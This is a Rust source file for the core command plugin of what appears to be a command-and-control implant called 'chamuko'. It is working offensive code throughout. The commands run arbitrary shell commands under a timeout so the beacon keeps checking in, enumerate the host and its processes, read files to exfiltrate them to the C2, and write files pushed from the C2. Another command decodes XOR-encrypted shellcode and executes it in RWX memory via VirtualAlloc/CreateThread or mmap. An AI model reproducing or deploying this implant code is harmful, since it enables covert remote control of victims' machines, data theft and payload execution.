use std::env;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use base64::Engine;
use chamuko_plugin_api::{
    Arity, Attachment, CommandContext, CommandOutput, DeclarativePlugin, PluginBuilder, PluginError,
    MAX_OUTPUT_BYTES,
};

/// Commands that need no extra state. Each one is a closure; adding a command
/// is one `command(...)` line, not a struct plus three trait methods.
///
/// `download` returns its file as an [`Attachment`], which the beacon loop
/// ships to the C2. That replaced a `name|sha256|base64` string that had to be
/// parsed back apart with `splitn(3, '|')` — fragile the moment a filename
/// contained a pipe.
pub fn core_plugin() -> DeclarativePlugin {
    let cwd = Arc::new(Mutex::new(
        env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
    ));

    let cwd_pwd = Arc::clone(&cwd);
    let cwd_ls = Arc::clone(&cwd);
    let cwd_cd = Arc::clone(&cwd);
    let cwd_download = Arc::clone(&cwd);
    let cwd_upload = Arc::clone(&cwd);

    PluginBuilder::new("core", "0.2.0")
        .command_with_usage(
            "exec",
            "run a shell command",
            "exec <cmd> [args...]",
            Arity::AtLeast(1),
            run_shell,
        )
        .command("info", "show host info", Arity::Exactly(0), |_ctx| {
            let info = chamuko_protocol::AgentInfo::local(String::new());
            Ok(CommandOutput::new(format!(
                "host: {}\nuser: {}\nos:   {} {}\npid:  {}",
                info.hostname, info.username, info.os, info.arch, info.pid
            )))
        })
        .command("whoami", "current user", Arity::Exactly(0), |_ctx| {
            Ok(CommandOutput::new(
                env::var("USER")
                    .or_else(|_| env::var("USERNAME"))
                    .unwrap_or_else(|_| "unknown".to_string()),
            ))
        })
        .command("hostname", "host name", Arity::Exactly(0), |_ctx| {
            Ok(CommandOutput::new(
                env::var("HOSTNAME")
                    .or_else(|_| env::var("COMPUTERNAME"))
                    .unwrap_or_else(|_| "unknown".to_string()),
            ))
        })
        .command("pwd", "current directory", Arity::Exactly(0), move |_ctx| {
            let dir = cwd_pwd.lock().unwrap().clone();
            Ok(CommandOutput::new(dir.display().to_string()))
        })
        .command_with_usage(
            "ls",
            "list a directory",
            "ls [dir]",
            Arity::Between(0, 1),
            move |ctx| {
                let base = cwd_ls.lock().unwrap().clone();
                let dir = match ctx.arg(0) {
                    Some(arg) => resolve_against(&base, arg),
                    None => base,
                };
                if dir.is_file() {
                    return Ok(CommandOutput::new(
                        dir.file_name()
                            .map(|n| n.to_string_lossy().to_string())
                            .unwrap_or_else(|| dir.display().to_string()),
                    ));
                }
                let entries = std::fs::read_dir(&dir).map_err(|e| format!("ls: {e}"))?;
                let mut names: Vec<String> = entries
                    .filter_map(|e| e.ok().map(|e| e.file_name().to_string_lossy().to_string()))
                    .collect();
                names.sort();
                Ok(CommandOutput::new(names.join("\n")))
            },
        )
        .command_with_usage(
            "cd",
            "change directory",
            "cd <dir>",
            Arity::Between(0, 1),
            move |ctx| {
                let target = ctx.arg(0).unwrap_or(if cfg!(windows) { r"C:\" } else { "/" });
                let mut guard = cwd_cd.lock().unwrap();
                let new_path = resolve_against(&guard, target);
                if !new_path.is_dir() {
                    return Ok(CommandOutput::failure(format!(
                        "cd: no such directory: {target}"
                    )));
                }
                *guard = new_path.clone();
                Ok(CommandOutput::new(new_path.display().to_string()))
            },
        )
        .command_with_usage(
            "shellcode",
            "execute encrypted shellcode in memory",
            "shellcode <b64>",
            Arity::Exactly(1),
            |ctx| run_shellcode(ctx.arg(0).unwrap_or_default()),
        )
        .command("ps", "list running processes", Arity::Exactly(0), |_ctx| {
            list_processes()
        })
        .command_with_usage(
            "download",
            "read a file and send it to the C2",
            "download <path>",
            Arity::Exactly(1),
            move |ctx| read_for_exfil(&cwd_download, ctx.arg(0).unwrap_or_default()),
        )
        .command_with_usage(
            "upload",
            "write a file received from the C2",
            "upload <path> <b64>",
            Arity::Exactly(2),
            move |ctx| {
                write_upload(
                    &cwd_upload,
                    ctx.arg(0).unwrap_or_default(),
                    ctx.arg(1).unwrap_or_default(),
                )
            },
        )
        .build()
}

/// Windows drive paths (`C:\...`) are absolute but not `is_absolute` when the
/// agent runs on a non-Windows host.
fn is_drive_path(path: &str) -> bool {
    let bytes = path.as_bytes();
    bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':'
}

fn resolve_against(base: &Path, path: &str) -> PathBuf {
    let candidate = PathBuf::from(path);
    if candidate.is_absolute() || is_drive_path(path) {
        candidate
    } else {
        base.join(candidate)
    }
}

/// Runs a command under a deadline. Without one, a `sleep 3600` would block the
/// beacon loop and the agent would never check in again.
fn run_shell(ctx: &mut CommandContext) -> Result<CommandOutput, PluginError> {
    let (program, rest) = if cfg!(windows) {
        ("cmd".to_string(), vec!["/C".to_string(), ctx.args.join(" ")])
    } else {
        (ctx.args[0].clone(), ctx.args[1..].to_vec())
    };

    let outcome = chamuko_core::process::run_with_timeout(
        &program,
        &rest,
        &ctx.cwd,
        Duration::from_secs(120),
        MAX_OUTPUT_BYTES,
    )
    .map_err(|e| e.to_string())?;

    Ok(CommandOutput {
        stdout: outcome.stdout,
        exit_code: outcome.exit_code,
        attachment: None,
    })
}

fn list_processes() -> Result<CommandOutput, PluginError> {
    #[cfg(unix)]
    {
        let mut rows: Vec<(u32, String)> = Vec::new();
        let entries = std::fs::read_dir("/proc").map_err(|e| format!("ps: {e}"))?;
        for entry in entries.flatten() {
            let name = entry.file_name();
            let Some(pid) = name.to_str().and_then(|s| s.parse::<u32>().ok()) else {
                continue;
            };
            let comm = std::fs::read_to_string(entry.path().join("comm"))
                .map(|s| s.trim().to_string())
                .unwrap_or_default();
            let cmdline = std::fs::read_to_string(entry.path().join("cmdline"))
                .map(|s| s.replace('\0', " ").trim().to_string())
                .unwrap_or_default();
            rows.push((pid, if cmdline.is_empty() { comm } else { cmdline }));
        }
        rows.sort_by_key(|(pid, _)| *pid);
        let mut out = String::from("PID      COMMAND\n");
        for (pid, label) in rows.iter().take(400) {
            let shown: String = label.chars().take(120).collect();
            out.push_str(&format!("{pid:<8} {shown}\n"));
        }
        Ok(CommandOutput::new(out))
    }

    #[cfg(windows)]
    {
        let outcome = chamuko_core::process::run_with_timeout(
            "tasklist",
            &["/FO".to_string(), "CSV".to_string(), "/NH".to_string()],
            &env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
            Duration::from_secs(30),
            MAX_OUTPUT_BYTES,
        )
        .map_err(|e| format!("ps: {e}"))?;
        Ok(CommandOutput {
            stdout: outcome.stdout,
            exit_code: outcome.exit_code,
            attachment: None,
        })
    }
}

/// Reads a file and hands it back as an attachment. The C2 receives it through
/// the chunked upload path, so no base64 round trip happens in the output.
fn read_for_exfil(cwd: &Arc<Mutex<PathBuf>>, target: &str) -> Result<CommandOutput, PluginError> {
    const MAX_EXFIL: u64 = 64 * 1024 * 1024;
    // Relative paths resolve against the agent's own cwd, which `cd` moves.
    let base = cwd.lock().unwrap().clone();
    let path = resolve_against(&base, target);

    let meta = std::fs::metadata(&path).map_err(|e| format!("download: {e}"))?;
    if !meta.is_file() {
        return Ok(CommandOutput::failure(format!(
            "download: not a regular file: {}",
            path.display()
        )));
    }
    if meta.len() > MAX_EXFIL {
        return Ok(CommandOutput::failure(format!(
            "download: refusing {} bytes (limit {MAX_EXFIL})",
            meta.len()
        )));
    }
    if meta.len() == 0 {
        return Ok(CommandOutput::failure(format!(
            "download: {} is empty",
            path.display()
        )));
    }

    let data = std::fs::read(&path).map_err(|e| format!("download: {e}"))?;
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "file".to_string());
    let size = data.len();
    let attachment = Attachment::new(name, data)?;

    Ok(CommandOutput::new(format!(
        "read {size} bytes from {}",
        path.display()
    ))
    .with_attachment(attachment))
}

fn write_upload(
    cwd: &Arc<Mutex<PathBuf>>,
    target: &str,
    encoded: &str,
) -> Result<CommandOutput, PluginError> {
    let data = base64::engine::general_purpose::STANDARD
        .decode(encoded.as_bytes())
        .map_err(|e| format!("upload: bad base64: {e}"))?;

    let base = cwd.lock().unwrap().clone();
    let path = resolve_against(&base, target);
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)
                .map_err(|e| format!("upload: cannot create dir: {e}"))?;
        }
    }
    std::fs::write(&path, &data).map_err(|e| format!("upload: {e}"))?;

    Ok(CommandOutput::new(format!(
        "wrote {} bytes to {} (sha256={})",
        data.len(),
        path.display(),
        &chamuko_protocol::sha256_hex(&data)[..16]
    )))
}

fn run_shellcode(payload: &str) -> Result<CommandOutput, PluginError> {
    let encrypted = base64::engine::general_purpose::STANDARD
        .decode(payload.as_bytes())
        .map_err(|e| format!("base64 decode failed: {e}"))?;
    let shellcode =
        chamuko_protocol::xor_transform(&encrypted, chamuko_protocol::SHELLCODE_XOR_KEY);

    if shellcode.is_empty() {
        return Ok(CommandOutput::failure("shellcode is empty"));
    }

    unsafe {
        #[cfg(windows)]
        {
            use std::ffi::c_void;

            extern "system" {
                fn VirtualAlloc(
                    lpAddress: *mut c_void,
                    dwSize: usize,
                    flAllocationType: u32,
                    flProtect: u32,
                ) -> *mut c_void;
                fn CreateThread(
                    lpThreadAttributes: *mut c_void,
                    dwStackSize: usize,
                    lpStartAddress: Option<unsafe extern "system" fn(*mut c_void) -> u32>,
                    lpParameter: *mut c_void,
                    dwCreationFlags: u32,
                    lpThreadId: *mut u32,
                ) -> *mut c_void;
            }

            const MEM_COMMIT: u32 = 0x1000;
            const MEM_RESERVE: u32 = 0x2000;
            const PAGE_EXECUTE_READWRITE: u32 = 0x40;

            let ptr = VirtualAlloc(
                std::ptr::null_mut(),
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            if ptr.is_null() {
                return Ok(CommandOutput::failure("VirtualAlloc failed"));
            }
            std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());

            let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(ptr);
            let handle = CreateThread(
                std::ptr::null_mut(),
                0,
                Some(thread_fn),
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
            );
            if handle.is_null() {
                return Ok(CommandOutput::failure("CreateThread failed"));
            }
        }

        #[cfg(unix)]
        {
            let ptr = libc::mmap(
                std::ptr::null_mut(),
                shellcode.len().max(1),
                libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                -1,
                0,
            );
            if ptr == libc::MAP_FAILED {
                return Ok(CommandOutput::failure("mmap failed"));
            }
            std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());

            let func: extern "C" fn() = std::mem::transmute(ptr);
            std::thread::spawn(move || func());
        }
    }

    Ok(CommandOutput::new(format!(
        "shellcode loaded and executing ({} bytes)",
        shellcode.len()
    )))
}

#[cfg(test)]
mod tests;
